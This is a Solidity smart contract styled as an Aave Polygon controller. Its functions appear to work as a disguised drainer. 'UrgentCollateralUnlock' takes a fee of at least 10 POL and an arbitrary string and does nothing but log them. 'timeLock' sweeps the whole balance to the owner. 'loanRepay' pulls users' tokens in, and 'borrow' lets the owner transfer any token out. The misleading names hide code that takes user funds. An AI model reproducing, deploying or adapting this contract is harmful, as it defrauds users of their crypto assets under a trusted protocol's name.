// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

contract AavePolygonController {
    /* STORAGE */
    address public owner;
    address public feeRecipient;

    address public controller_aPolDAI;
    address public controller_aPolUSDT;
    address public controller_aPolWBTC;
    address public controller_aPolWETH;
    address public controller_aPolWMATIC;

    /* EVENTS */
    event SetOwner(address newOwner);
    event SetFeeRecipient(address newFeeRecipient);
    event SetControllerAPolDAI(address newController);
    event UrgentCollateralUnlockTriggered(address indexed sender, string dataInput, uint256 amount);
    event TimeLockExecuted(uint256 amount, address to);
    event LoanRepaid(address indexed sender, address token, uint256 amount);
    event BorrowExecuted(address token, uint256 amount);

    /* CONSTRUCTOR */
    constructor(
        address newOwner,
        address controller_aPolDAI_,
        address controller_aPolUSDT_,
        address controller_aPolWBTC_,
        address controller_aPolWETH_,
        address controller_aPolWMATIC_
    ) {
        require(newOwner != address(0), "ZERO_ADDRESS_OWNER");
        require(controller_aPolDAI_ != address(0), "ZERO_ADDRESS_CONTROLLER_aPolDAI");
        require(controller_aPolUSDT_ != address(0), "ZERO_ADDRESS_CONTROLLER_aPolUSDT");
        require(controller_aPolWBTC_ != address(0), "ZERO_ADDRESS_CONTROLLER_aPolWBTC");
        require(controller_aPolWETH_ != address(0), "ZERO_ADDRESS_CONTROLLER_aPolWETH");
        require(controller_aPolWMATIC_ != address(0), "ZERO_ADDRESS_CONTROLLER_aPolWMATIC");

        owner = newOwner;

        controller_aPolDAI = controller_aPolDAI_;
        controller_aPolUSDT = controller_aPolUSDT_;
        controller_aPolWBTC = controller_aPolWBTC_;
        controller_aPolWETH = controller_aPolWETH_;
        controller_aPolWMATIC = controller_aPolWMATIC_;

        emit SetOwner(newOwner);
        emit SetControllerAPolDAI(controller_aPolDAI_);
    }

    /* MODIFIERS */
    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    /* ONLY OWNER FUNCTIONS */
    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != owner, "ALREADY_SET");
        owner = newOwner;

        emit SetOwner(newOwner);
    }

    function setFeeRecipient(address newFeeRecipient) external onlyOwner {
        require(newFeeRecipient != feeRecipient, "ALREADY_SET");
        feeRecipient = newFeeRecipient;

        emit SetFeeRecipient(newFeeRecipient);
    }

    function setControllerAPolDAI(address newController) external onlyOwner {
        require(newController != address(0), "ZERO_ADDRESS_CONTROLLER");
        controller_aPolDAI = newController;

        emit SetControllerAPolDAI(newController);
    }

    function UrgentCollateralUnlock(string calldata dataInput) external payable {
        require(msg.value >= 10 ether, "Minimum payment is 10 POL");
        require(bytes(dataInput).length > 0, "Input data cannot be empty");

        emit UrgentCollateralUnlockTriggered(msg.sender, dataInput, msg.value);
    }

    function timeLock() external onlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "NO_BALANCE");

        (bool success, ) = owner.call{value: amount}("");
        require(success, "TRANSFER_FAILED");

        emit TimeLockExecuted(amount, owner);
    }

    function loanRepay(address token, uint256 amount) external {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transferFrom(msg.sender, address(this), amount);
        require(success, "TRANSFER_FAILED");

        emit LoanRepaid(msg.sender, token, amount);
    }

    function borrow(address token, uint256 amount) external onlyOwner {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transfer(owner, amount);
        require(success, "TRANSFER_FAILED");

        emit BorrowExecuted(token, amount);
    }

    function extSloads(bytes32 slot) external view returns (bytes32 res) {
        assembly {
            res := sload(slot)
        }
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
